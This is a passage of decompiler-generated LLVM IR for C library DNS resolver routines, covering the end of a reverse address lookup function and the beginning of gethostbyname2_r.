dec_label_pc_27f2c:                               ; preds = %dec_label_pc_27f18
  %v7_27f2c = icmp eq i32 %v0_27ef8, 16
  br i1 %v7_27f2c, label %dec_label_pc_27f34, label %dec_label_pc_28190

dec_label_pc_27f30:                               ; preds = %dec_label_pc_27f10
  %v7_27f24 = icmp eq i32 %v0_27ef8, 4
  br i1 %v7_27f24, label %dec_label_pc_27f34, label %dec_label_pc_28190

dec_label_pc_27f34:                               ; preds = %dec_label_pc_27f2c, %dec_label_pc_27f30
  %v0_27f40 = load i32, i32* @r6, align 4
  store i32 %v0_27f40, i32* %r0.global-to-local, align 4
  %v9_27f58 = call i32 @__get_hosts_byaddr_r(i32 %v0_27f40, i32 %v0_27ef8, i32 %v0_27efc, i32 %v0_27f00, i32 %v2_27f08, i32 %tmp14, i32 %tmp16, i32 %tmp12)
  store i32 %v9_27f58, i32* %r0.global-to-local, align 4
  %v2_27f5c = icmp eq i32 %v9_27f58, 0
  br i1 %v2_27f5c, label %dec_label_pc_2819c, label %dec_label_pc_27f64

dec_label_pc_27f64:                               ; preds = %dec_label_pc_27f34
  store i32 %tmp12, i32* %r2.global-to-local, align 4
  %v1_27f68 = inttoptr i32 %tmp12 to i32*
  %v2_27f68 = load i32, i32* %v1_27f68, align 4
  store i32 %v2_27f68, i32* %r3.global-to-local, align 4
  %v7_27f6c = icmp eq i32 %v2_27f68, 1
  br i1 %v7_27f6c, label %dec_label_pc_27f7c, label %dec_label_pc_27f74

dec_label_pc_27f74:                               ; preds = %dec_label_pc_27f64
  %v7_27f74 = icmp eq i32 %v2_27f68, 4
  br i1 %v7_27f74, label %dec_label_pc_27f7c, label %dec_label_pc_2819c

dec_label_pc_27f7c:                               ; preds = %dec_label_pc_27f74, %dec_label_pc_27f64
  store i32 %tmp12, i32* @ip, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_27f84 = load i32, i32* @r8, align 4
  store i32 -1, i32* %v1_27f68, align 4
  %tmp39 = icmp ugt i32 %v0_27f84, 16
  br i1 %tmp39, label %dec_label_pc_28198, label %dec_label_pc_27f90

dec_label_pc_27f90:                               ; preds = %dec_label_pc_27f7c
  %v0_27f90 = load i32, i32* @r4, align 4
  %v1_27f90 = sub i32 0, %v0_27f90
  %v1_27f94 = urem i32 %v1_27f90, 4
  store i32 %v1_27f94, i32* %r2.global-to-local, align 4
  %v1_27f98 = load i32, i32* @r5, align 4
  %v2_27f98 = sub i32 %v1_27f98, %v1_27f94
  store i32 %v2_27f98, i32* %r3.global-to-local, align 4
  %v1_27f9c = add i32 %v2_27f98, -24
  store i32 %v1_27f9c, i32* @fp, align 4
  %v7_27fa4 = icmp slt i32 %v1_27f9c, 256
  br i1 %v7_27fa4, label %dec_label_pc_28198, label %dec_label_pc_27fa8

dec_label_pc_27fa8:                               ; preds = %dec_label_pc_27f90
  %v2_27fa8 = add i32 %v1_27f94, %v0_27f90
  store i32 %v2_27fa8, i32* @sb, align 4
  %v1_27fac = add i32 %v2_27fa8, 8
  store i32 %v1_27fac, i32* @r0, align 4
  store i32 0, i32* @r3, align 4
  %v1_27fb4 = add i32 %v2_27fa8, 24
  store i32 %v1_27fb4, i32* @r7, align 4
  %v4_27fb8 = inttoptr i32 %v2_27fa8 to i32*
  store i32 %v1_27fac, i32* %v4_27fb8, align 4
  %v0_27fbc = load i32, i32* @r7, align 4
  %v1_27fbc = load i32, i32* @r4, align 4
  %v2_27fbc = load i32, i32* %r2.global-to-local, align 4
  %v3_27fbc = add i32 %v2_27fbc, %v1_27fbc
  %v4_27fbc = inttoptr i32 %v3_27fbc to i32*
  store i32 %v0_27fbc, i32* %v4_27fbc, align 4
  %v0_27fc0 = load i32, i32* @r3, align 4
  %v1_27fc0 = load i32, i32* @sb, align 4
  %v2_27fc0 = add i32 %v1_27fc0, 4
  %v3_27fc0 = inttoptr i32 %v2_27fc0 to i32*
  store i32 %v0_27fc0, i32* %v3_27fc0, align 4
  %v0_27fc4 = load i32, i32* @r6, align 4
  store i32 %v0_27fc4, i32* @r1, align 4
  %v0_27fc8 = load i32, i32* @r8, align 4
  store i32 %v0_27fc8, i32* @r2, align 4
  %v0_27fcc = call i32 @memcpy()
  store i32 %v0_27efc, i32* %r0.global-to-local, align 4
  %v0_27fdc = load i32, i32* @r6, align 4
  br i1 %v7_27f10, label %dec_label_pc_27fdc, label %dec_label_pc_2800c

dec_label_pc_27fdc:                               ; preds = %dec_label_pc_27fa8
  %v1_27fe0 = add i32 %v0_27fdc, 3
  %v2_27fe0 = inttoptr i32 %v1_27fe0 to i8*
  %v3_27fe0 = load i8, i8* %v2_27fe0, align 1
  %v4_27fe0 = zext i8 %v3_27fe0 to i32
  store i32 %v4_27fe0, i32* %r2.global-to-local, align 4
  %v1_27fe4 = add i32 %v0_27fdc, 2
  %v2_27fe4 = inttoptr i32 %v1_27fe4 to i8*
  %v3_27fe4 = load i8, i8* %v2_27fe4, align 1
  %v4_27fe4 = zext i8 %v3_27fe4 to i32
  store i32 %v4_27fe4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r0.global-to-local, align 4
  %v0_27ffc = load i32, i32* @r7, align 4
  store i32 %v0_27ffc, i32* @r0, align 4
  %v3_28004 = call i32 @sprintf(i32 %v0_27ffc, i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36276), i32 %v4_27fe0)
  br label %dec_label_pc_28060

dec_label_pc_2800c:                               ; preds = %dec_label_pc_27fa8
  %v1_2800c = load i32, i32* @r8, align 4
  %v2_2800c = add i32 %v0_27fdc, -1
  %v1_28010 = add i32 %v2_2800c, %v1_2800c
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36248), i32* %r3.global-to-local, align 4
  %v0_28024 = load i32, i32* @r7, align 4
  store i32 %v0_28024, i32* @r4, align 4
  br label %dec_label_pc_28028

dec_label_pc_28028:                               ; preds = %dec_label_pc_28028, %dec_label_pc_2800c
  %v0_2802c = phi i32 [ %v2_28044, %dec_label_pc_28028 ], [ %v0_28024, %dec_label_pc_2800c ]
  %v0_28028 = phi i32 [ %v0_28040, %dec_label_pc_28028 ], [ %v1_28010, %dec_label_pc_2800c ]
  %v1_28028 = inttoptr i32 %v0_28028 to i8*
  %v2_28028 = load i8, i8* %v1_28028, align 1
  %v5_28028 = add i32 %v0_28028, -1
  store i32 %v5_28028, i32* @r5, align 4
  store i32 %v0_2802c, i32* @r0, align 4
  %div = udiv i8 %v2_28028, 16
  %v3_28030 = zext i8 %div to i32
  store i32 %v3_28030, i32* %r3.global-to-local, align 4
  %tmp40 = urem i8 %v2_28028, 16
  %v1_28038 = zext i8 %tmp40 to i32
  store i32 %v1_28038, i32* %r2.global-to-local, align 4
  %v3_2803c = call i32 @sprintf(i32 %v0_2802c, i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36248), i32 %v1_28038)
  store i32 %v3_2803c, i32* %r0.global-to-local, align 4
  %v0_28040 = load i32, i32* @r5, align 4
  %v1_28040 = load i32, i32* @r6, align 4
  %v3_28040 = icmp ult i32 %v0_28040, %v1_28040
  %v0_28044 = load i32, i32* @r4, align 4
  %v2_28044 = add i32 %v0_28044, %v3_2803c
  store i32 %v2_28044, i32* @r4, align 4
  br i1 %v3_28040, label %dec_label_pc_2804c, label %dec_label_pc_28028

dec_label_pc_2804c:                               ; preds = %dec_label_pc_28028
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_28044, i32* %r0.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36240), i32* @r1, align 4
  %v2_2805c = inttoptr i32 %v2_28044 to i8*
  %v3_2805c = call i32 @strcpy(i8* %v2_2805c, i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36240))
  br label %dec_label_pc_28060

dec_label_pc_28060:                               ; preds = %dec_label_pc_27fdc, %dec_label_pc_2804c
  %v2_28060 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_28060, i32* @r4, align 4
  store i32 %v2_28060, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 40, i32* @r2, align 4
  %v0_28070 = call i32 @__GI_memset()
  store i32 %v0_28070, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v2_2807c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_2807c, i32* @r6, align 4
  %v7_280c4 = icmp eq i32 %tmp7, 5
  br label %dec_label_pc_28080

dec_label_pc_28080:                               ; preds = %dec_label_pc_280ec, %dec_label_pc_28060
  store i32 %v2_2807c, i32* %r2.global-to-local, align 4
  store i32 %v2_28060, i32* %r3.global-to-local, align 4
  %v0_2808c = load i32, i32* @r7, align 4
  store i32 %v0_2808c, i32* %r0.global-to-local, align 4
  %v4_28090 = inttoptr i32 %v0_2808c to i8*
  %v5_28090 = call i32 @__dns_lookup(i8* %v4_28090, i32 12, i32 %v2_2807c, i32 %v2_28060)
  store i32 %v5_28090, i32* @r4, align 4
  %v1_28094 = icmp slt i32 %v5_28090, 0
  %v0_28098 = load i32, i32* @fp, align 4
  store i32 %v0_28098, i32* %r2.global-to-local, align 4
  %v0_2809c = load i32, i32* @r5, align 4
  %v1_2809c = add i32 %v0_2809c, 1
  store i32 %v1_2809c, i32* @r5, align 4
  %v0_280a0 = load i32, i32* @r7, align 4
  %.v0_280a0 = select i1 %v1_28094, i32 2, i32 %v0_280a0
  store i32 %.v0_280a0, i32* %r0.global-to-local, align 4
  br i1 %v1_28094, label %dec_label_pc_28184.loopexit, label %dec_label_pc_280b0

dec_label_pc_280b0:                               ; preds = %dec_label_pc_28080
  %v3_280b0 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_280b0, i32* @r1, align 4
  %v2_280b4 = call i32 @strncpy(i32 %.v0_280a0, i32 %v3_280b0)
  %v3_280b8 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_280b8, i32* @r0, align 4
  %v0_280bc = call i32 @free()
  store i32 %v0_280bc, i32* %r0.global-to-local, align 4
  %v0_280c8 = load i32, i32* @r4, align 4
  store i32 %v0_280c8, i32* %r2.global-to-local, align 4
  %v0_280cc = load i32, i32* @r7, align 4
  store i32 %v0_280cc, i32* @r3, align 4
  br i1 %v7_280c4, label %dec_label_pc_280d4, label %dec_label_pc_2811c

dec_label_pc_280d4:                               ; preds = %dec_label_pc_280b0
  %v0_280d4 = load i32, i32* @r5, align 4
  %v7_280d8 = icmp sgt i32 %v0_280d4, 5
  br i1 %v7_280d8, label %.thread, label %dec_label_pc_280ec

.thread:                                          ; preds = %dec_label_pc_280d4
  store i32 %tmp12, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %v1_27f68, align 4
  br label %dec_label_pc_2819c

dec_label_pc_280ec:                               ; preds = %dec_label_pc_280d4
  store i32 %tmp6, i32* @r1, align 4
  %v3_280f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_280f0, i32* %r0.global-to-local, align 4
  %v2_280f8 = call i32 @__decode_dotted(i32 %v3_280f0, i32 %tmp6)
  store i32 %v2_280f8, i32* @r4, align 4
  %v3_28100 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_28100, i32* @r0, align 4
  %v0_28104 = call i32 @free()
  store i32 %v0_28104, i32* %r0.global-to-local, align 4
  %v0_28108 = load i32, i32* @r4, align 4
  %v1_28108 = icmp slt i32 %v0_28108, 0
  br i1 %v1_28108, label %dec_label_pc_28110, label %dec_label_pc_28080

dec_label_pc_28110:                               ; preds = %dec_label_pc_280ec
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_28184

dec_label_pc_2811c:                               ; preds = %dec_label_pc_280b0
  %v7_2811c = icmp eq i32 %tmp7, 12
  br i1 %v7_2811c, label %dec_label_pc_28124, label %dec_label_pc_28174

dec_label_pc_28124:                               ; preds = %dec_label_pc_2811c
  store i32 %v0_280c8, i32* %r2.global-to-local, align 4
  store i32 %v0_280cc, i32* @r3, align 4
  store i32 %tmp6, i32* @r1, align 4
  %v3_28130 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_28130, i32* %r0.global-to-local, align 4
  %v2_28138 = call i32 @__decode_dotted(i32 %v3_28130, i32 %tmp6)
  %v3_2813c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_2813c, i32* @r0, align 4
  %v0_28140 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_2814c = load i32, i32* @sl, align 4
  store i32 %v0_2814c, i32* %v2_27ee8, align 4
  store i32 %tmp12, i32* %r2.global-to-local, align 4
  %v0_28158 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_28158, i32* %r0.global-to-local, align 4
  %v1_2815c = load i32, i32* @sl, align 4
  %v2_2815c = add i32 %v1_2815c, 8
  %v3_2815c = inttoptr i32 %v2_2815c to i32*
  store i32 %v0_27efc, i32* %v3_2815c, align 4
  %v0_28160 = load i32, i32* @r8, align 4
  %v1_28160 = load i32, i32* @sl, align 4
  %v2_28160 = add i32 %v1_28160, 12
  %v3_28160 = inttoptr i32 %v2_28160 to i32*
  store i32 %v0_28160, i32* %v3_28160, align 4
  %v0_28164 = load i32, i32* @sl, align 4
  %v1_28164 = inttoptr i32 %v0_28164 to i32*
  %v2_28164 = load i32, i32* @r7, align 4
  store i32 %v2_28164, i32* %v1_28164, align 4
  %v3_28164 = add i32 %v0_28164, 4
  %v4_28164 = inttoptr i32 %v3_28164 to i32*
  %v5_28164 = load i32, i32* @sb, align 4
  store i32 %v5_28164, i32* %v4_28164, align 4
  %v0_28168 = load i32, i32* %r3.global-to-local, align 4
  %v1_28168 = load i32, i32* %r2.global-to-local, align 4
  %v2_28168 = inttoptr i32 %v1_28168 to i32*
  store i32 %v0_28168, i32* %v2_28168, align 4
  %v0_2816c = load i32, i32* @sb, align 4
  %v1_2816c = load i32, i32* @sl, align 4
  %v2_2816c = add i32 %v1_2816c, 16
  %v3_2816c = inttoptr i32 %v2_2816c to i32*
  store i32 %v0_2816c, i32* %v3_2816c, align 4
  br label %dec_label_pc_2819c

dec_label_pc_28174:                               ; preds = %dec_label_pc_2811c
  %v3_28174 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_28174, i32* @r0, align 4
  %v0_28178 = call i32 @free()
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_28184

dec_label_pc_28184.loopexit:                      ; preds = %dec_label_pc_28080
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_28184

dec_label_pc_28184:                               ; preds = %dec_label_pc_28184.loopexit, %dec_label_pc_28110, %dec_label_pc_28174
  %v0_28188 = phi i32 [ 1, %dec_label_pc_28184.loopexit ], [ 3, %dec_label_pc_28110 ], [ 4, %dec_label_pc_28174 ]
  store i32 %v0_28188, i32* %v1_27f68, align 4
  br label %dec_label_pc_2819c

dec_label_pc_28190:                               ; preds = %dec_label_pc_27f2c, %dec_label_pc_27f30, %dec_label_pc_27f18, %entry
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2819c

dec_label_pc_28198:                               ; preds = %dec_label_pc_27f90, %dec_label_pc_27f7c
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2819c

dec_label_pc_2819c:                               ; preds = %.thread, %dec_label_pc_27f74, %dec_label_pc_27f34, %dec_label_pc_28190, %dec_label_pc_28184, %dec_label_pc_28124, %dec_label_pc_28198
  store i32 %v3_27ecc, i32* @r4, align 4
  store i32 %v6_27ecc, i32* @r5, align 4
  store i32 %v9_27ecc, i32* @r6, align 4
  store i32 %v12_27ecc, i32* @r7, align 4
  store i32 %v15_27ecc, i32* @r8, align 4
  store i32 %v18_27ecc, i32* @sb, align 4
  store i32 %v21_27ecc, i32* @sl, align 4
  store i32 %v24_27ecc, i32* @fp, align 4
  %v1_281a4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_281a4

; uselistorder directives
  uselistorder i1 %v1_28094, { 1, 0 }
  uselistorder i32 %v2_28060, { 1, 0, 2, 3 }
  uselistorder i32 %v2_28044, { 1, 0, 3, 2 }
  uselistorder i32 %v0_28040, { 1, 0 }
  uselistorder i32 %v0_28028, { 1, 0 }
  uselistorder i32 %v0_2802c, { 1, 0 }
  uselistorder i32 %v1_27f94, { 2, 1, 0 }
  uselistorder i32* %v1_27f68, { 2, 0, 1, 3 }
  uselistorder i32 %v0_27efc, { 2, 3, 4, 0, 1 }
  uselistorder i32 %tmp16, { 1, 0 }
  uselistorder i32 %tmp12, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp6, { 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 20, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 21, 18, 19, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36240), { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36248), { 1, 0 }
  uselistorder label %dec_label_pc_2819c, { 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_28190, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_28184, { 0, 2, 1 }
  uselistorder label %dec_label_pc_28060, { 1, 0 }
  uselistorder label %dec_label_pc_27f34, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v3_281b8 = load i32, i32* @r4, align 4
  %v6_281b8 = load i32, i32* @r5, align 4
  %v9_281b8 = load i32, i32* @r6, align 4
  %v12_281b8 = load i32, i32* @r7, align 4
  %v15_281b8 = load i32, i32* @r8, align 4
  %v18_281b8 = load i32, i32* @sb, align 4
  %v21_281b8 = load i32, i32* @sl, align 4
  %v24_281b8 = load i32, i32* @fp, align 4
  %v7_281bc = icmp eq i32 %arg2, 2
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %tmp24, i32* @sl, align 4
  br i1 %v7_281bc, label %dec_label_pc_281e0, label %dec_label_pc_28200

dec_label_pc_281e0:                               ; preds = %entry
  store i32 %tmp14, i32* @ip, align 4
  store i32 %arg4, i32* @r2, align 4
  store i32 %tmp24, i32* @r3, align 4
  %v2_281f8 = inttoptr i32 %arg1 to i8*
  %v3_281f8 = call i32 @gethostbyname_r(i8* %v2_281f8, i32 %tmp)
  store i32 %v3_281f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2844c

dec_label_pc_28200:                               ; preds = %entry
  store i32 %tmp14, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v7_28208 = icmp eq i32 %arg2, 10
  %v2_2820c = inttoptr i32 %tmp14 to i32*
  store i32 0, i32* %v2_2820c, align 4
  br i1 %v7_28208, label %dec_label_pc_28214, label %dec_label_pc_28448

dec_label_pc_28214:                               ; preds = %dec_label_pc_28200
  %v1_28214 = load i32, i32* @r7, align 4
  %v9_28214 = icmp eq i32 %v1_28214, %arg1
  br i1 %v9_28214, label %dec_label_pc_28448, label %dec_label_pc_2821c

dec_label_pc_2821c:                               ; preds = %dec_label_pc_28214
  %v0_2821c = call i32 @__GI___errno_location()
  store i32 %v0_2821c, i32* %r0.global-to-local, align 4
  store i32 %tmp14, i32* %ip.global-to-local, align 4
  store i32 %v0_2821c, i32* @r5, align 4
  %v0_28228 = load i32, i32* @r4, align 4
  %v0_2822c = load i32, i32* @r6, align 4
  store i32 %v0_2822c, i32* %r2.global-to-local, align 4
  %v1_28230 = inttoptr i32 %v0_2821c to i32*
  %v2_28230 = load i32, i32* %v1_28230, align 4
  store i32 %v2_28230, i32* @r4, align 4
  %v0_28234 = load i32, i32* @r8, align 4
  store i32 %v0_28234, i32* %r3.global-to-local, align 4
  %v0_28238 = load i32, i32* @r7, align 4
  store i32 %v0_28238, i32* %v1_28230, align 4
  %v0_2823c = load i32, i32* @sb, align 4
  store i32 %v0_2823c, i32* %r0.global-to-local, align 4
  %v2_28240 = load i32, i32* @sl, align 4
  %v5_28240 = load i32, i32* %ip.global-to-local, align 4
  %v0_28244 = load i32, i32* @fp, align 4
  %v7_28248 = call i32 @__get_hosts_byname_r(i32 %v0_2823c, i32 %v0_28228, i32 %v0_2822c, i32 %v0_28234, i32 %v2_28240, i32 %v5_28240, i32 %v0_28244)
  store i32 %v7_28248, i32* %r0.global-to-local, align 4
  %v2_2824c = icmp eq i32 %v7_28248, 0
  br i1 %v2_2824c, label %bb, label %dec_label_pc_28258

bb:                                               ; preds = %dec_label_pc_2821c
  %v1_28250 = load i32, i32* @r4, align 4
  %v2_28250 = load i32, i32* @r5, align 4
  %v3_28250 = inttoptr i32 %v2_28250 to i32*
  store i32 %v1_28250, i32* %v3_28250, align 4
  br label %dec_label_pc_2844c

dec_label_pc_28258:                               ; preds = %dec_label_pc_2821c
  %v0_28258 = load i32, i32* @fp, align 4
  %v1_28258 = inttoptr i32 %v0_28258 to i32*
  %v2_28258 = load i32, i32* %v1_28258, align 4
  store i32 %v2_28258, i32* %r3.global-to-local, align 4
  %v7_2825c = icmp eq i32 %v2_28258, 1
  br i1 %v7_2825c, label %dec_label_pc_28278, label %dec_label_pc_28264

dec_label_pc_28264:                               ; preds = %dec_label_pc_28258
  %v7_28264 = icmp eq i32 %v2_28258, 4
  br i1 %v7_28264, label %dec_label_pc_28294, label %dec_label_pc_2826c

dec_label_pc_2826c:                               ; preds = %dec_label_pc_28264
  %v3_2826c = icmp eq i32 %v2_28258, -1
  br i1 %v3_2826c, label %dec_label_pc_28288, label %dec_label_pc_2844c

dec_label_pc_28278:                               ; preds = %dec_label_pc_28258
  %v7_28278 = icmp eq i32 %v7_28248, 2
  br i1 %v7_28278, label %.thread1, label %bb29

bb29:                                             ; preds = %dec_label_pc_28278
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_28298

.thread1:                                         ; preds = %dec_label_pc_28278
  store i32 1, i32* @r7, align 4
  br label %dec_label_pc_28298

dec_label_pc_28288:                               ; preds = %dec_label_pc_2826c
  %v0_28288 = load i32, i32* @r5, align 4
  %v1_28288 = inttoptr i32 %v0_28288 to i32*
  %v2_28288 = load i32, i32* %v1_28288, align 4
  store i32 %v2_28288, i32* %r3.global-to-local, align 4
  %v7_2828c = icmp eq i32 %v2_28288, 2
  br i1 %v7_2828c, label %dec_label_pc_28294, label %dec_label_pc_2844c

dec_label_pc_28294:                               ; preds = %dec_label_pc_28288, %dec_label_pc_28264
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_28298

dec_label_pc_28298:                               ; preds = %bb29, %.thread1, %dec_label_pc_28294
  %v0_28298 = load i32, i32* @r8, align 4
  %v1_28298 = sub i32 0, %v0_28298
  %v1_2829c = urem i32 %v1_28298, 4
  store i32 %v1_2829c, i32* %r0.global-to-local, align 4
  %v1_282a0 = load i32, i32* @sl, align 4
  %v2_282a0 = sub i32 %v1_282a0, %v1_2829c
  %v1_282a4 = add i32 %v2_282a0, -24
  store i32 %v1_282a4, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_282b0 = load i32, i32* @r4, align 4
  %v1_282b0 = load i32, i32* @r5, align 4
  %v2_282b0 = inttoptr i32 %v1_282b0 to i32*
  store i32 %v0_282b0, i32* %v2_282b0, align 4
  %v7_282b4 = icmp sgt i32 %v1_282a4, 255
  br i1 %v7_282b4, label %dec_label_pc_282c0, label %bb30

bb30:                                             ; preds = %dec_label_pc_28298
  store i32 34, i32* %r0.global-to-local, align 4
  %v0_282b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_282b8 = load i32, i32* @fp, align 4
  %v2_282b8 = inttoptr i32 %v1_282b8 to i32*
  store i32 %v0_282b8, i32* %v2_282b8, align 4
  br label %dec_label_pc_2844c

dec_label_pc_282c0:                               ; preds = %dec_label_pc_28298
  %v0_282b83 = load i32, i32* %r3.global-to-local, align 4
  %v1_282b84 = load i32, i32* @fp, align 4
  %v2_282b85 = inttoptr i32 %v1_282b84 to i32*
  store i32 %v0_282b83, i32* %v2_282b85, align 4
  %v0_282c0 = load i32, i32* @r8, align 4
  %v1_282c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_282c0 = add i32 %v1_282c0, %v0_282c0
  store i32 %v2_282c0, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_282c8 = add i32 %v2_282c0, 16
  store i32 %v1_282c8, i32* %r2.global-to-local, align 4
  %v1_282cc = add i32 %v2_282c0, 24
  store i32 %v1_282cc, i32* @r5, align 4
  %v3_282d4 = inttoptr i32 %v1_282c8 to i32*
  store i32 %v2_282c0, i32* %v3_282d4, align 4
  %v0_282d8 = load i32, i32* @sb, align 4
  store i32 %v0_282d8, i32* @r1, align 4
  %v0_282dc = load i32, i32* @r4, align 4
  %v1_282dc = load i32, i32* %r2.global-to-local, align 4
  %v2_282dc = add i32 %v1_282dc, 4
  %v3_282dc = inttoptr i32 %v2_282dc to i32*
  store i32 %v0_282dc, i32* %v3_282dc, align 4
  %v0_282e0 = load i32, i32* @r5, align 4
  store i32 %v0_282e0, i32* %r0.global-to-local, align 4
  %v0_282e4 = load i32, i32* @sl, align 4
  store i32 %v0_282e4, i32* %r2.global-to-local, align 4
  %v2_282e8 = call i32 @strncpy(i32 %v0_282e0, i32 %v0_282d8)
  %v0_282ec = load i32, i32* @r4, align 4
  %v1_282ec = trunc i32 %v0_282ec to i8
  %v2_282ec = load i32, i32* @r5, align 4
  %v3_282ec = load i32, i32* @sl, align 4
  %v4_282ec = add i32 %v3_282ec, %v2_282ec
  %v5_282ec = inttoptr i32 %v4_282ec to i8*
  store i8 %v1_282ec, i8* %v5_282ec, align 1
  %v0_282f0 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_282f8 = load i32, i32* @r8, align 4
  store i32 %v0_282f8, i32* %r2.global-to-local, align 4
  %v3_282fc = inttoptr i32 %v0_282f0 to i8*
  %v4_282fc = call i32 @inet_pton(i32 10, i8* %v3_282fc, i32 %v0_282f8)
  store i32 %v4_282fc, i32* %r0.global-to-local, align 4
  %v1_28300 = load i32, i32* @r4, align 4
  %v9_28300 = icmp eq i32 %v4_282fc, %v1_28300
  br i1 %v9_28300, label %dec_label_pc_28338, label %dec_label_pc_28308

dec_label_pc_28308:                               ; preds = %dec_label_pc_282c0
  store i32 %v1_282c8, i32* @ip, align 4
  %v0_28310 = load i32, i32* @r6, align 4
  store i32 %v0_28310, i32* %v2_2820c, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_28318 = load i32, i32* @r6, align 4
  %v2_28318 = add i32 %v1_28318, 8
  %v3_28318 = inttoptr i32 %v2_28318 to i32*
  store i32 10, i32* %v3_28318, align 4
  %v0_2831c = load i32, i32* @r4, align 4
  store i32 %v0_2831c, i32* %r0.global-to-local, align 4
  %v0_28320 = load i32, i32* %r3.global-to-local, align 4
  %v1_28320 = add i32 %v0_28320, 6
  store i32 %v1_28320, i32* %r3.global-to-local, align 4
  %v1_28324 = load i32, i32* @r6, align 4
  %v2_28324 = add i32 %v1_28324, 12
  %v3_28324 = inttoptr i32 %v2_28324 to i32*
  store i32 %v1_28320, i32* %v3_28324, align 4
  %v0_28328 = load i32, i32* @r5, align 4
  %v1_28328 = load i32, i32* @r6, align 4
  %v2_28328 = inttoptr i32 %v1_28328 to i32*
  store i32 %v0_28328, i32* %v2_28328, align 4
  %v0_2832c = load i32, i32* @ip, align 4
  %v1_2832c = load i32, i32* @r6, align 4
  %v2_2832c = add i32 %v1_2832c, 16
  %v3_2832c = inttoptr i32 %v2_2832c to i32*
  store i32 %v0_2832c, i32* %v3_2832c, align 4
  %v0_28330 = load i32, i32* @r4, align 4
  %v1_28330 = load i32, i32* @fp, align 4
  %v2_28330 = inttoptr i32 %v1_28330 to i32*
  store i32 %v0_28330, i32* %v2_28330, align 4
  br label %dec_label_pc_2844c

dec_label_pc_28338:                               ; preds = %dec_label_pc_282c0
  %v0_28338 = load i32, i32* @r7, align 4
  %v2_28338 = icmp eq i32 %v0_28338, 0
  br i1 %v2_28338, label %dec_label_pc_28340, label %dec_label_pc_28438

dec_label_pc_28340:                               ; preds = %dec_label_pc_28338
  %v2_28340 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_28340, i32* @r4, align 4
  store i32 %v2_28340, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 40, i32* @r2, align 4
  %v0_28350 = call i32 @__GI_memset()
